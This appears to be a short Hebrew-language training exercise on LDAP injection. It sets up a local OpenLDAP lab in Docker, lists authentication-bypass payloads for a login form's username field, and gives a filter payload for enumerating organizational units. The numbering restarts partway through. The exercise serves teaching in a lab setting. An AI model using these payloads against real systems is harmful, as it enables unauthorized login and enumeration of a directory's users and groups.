# הinjection LDAP - תרגיל

## תרגיל 1 - bypass אותנטיקציה

### משימות

1. הקימו סביבת תרגול מקומית עם OpenLDAP ואפליקציית PHP:

```bash
# Setting up OpenLDAP with Docker
docker run -d --name openldap \
    -e LDAP_ORGANISATION="TestOrg" \
    -e LDAP_DOMAIN="test.local" \
    -e LDAP_ADMIN_PASSWORD="admin" \
    -p 389:389 \
    osixia/openldap
```

2. צרו אפליקציית PHP פשוטה עם טופס התחברות שמשתמשת ב-LDAP
3. נסו את הפיילואדים הבאים בשדה שם המשתמש:

```
*
admin)(|(&
admin)(&))
*)(&
admin)%00
```

4. תעדו אילו payloads הצליחו ולמה

2. גלו את כל ה-Organizational Units:

```
# Check if the ou exists

*)(objectClass=organizationalUnit)(ou=B*
```

3. גלו את כל הקבוצות ואת החברים שלהן
4. גלו את כל המשתמשים בכל OU
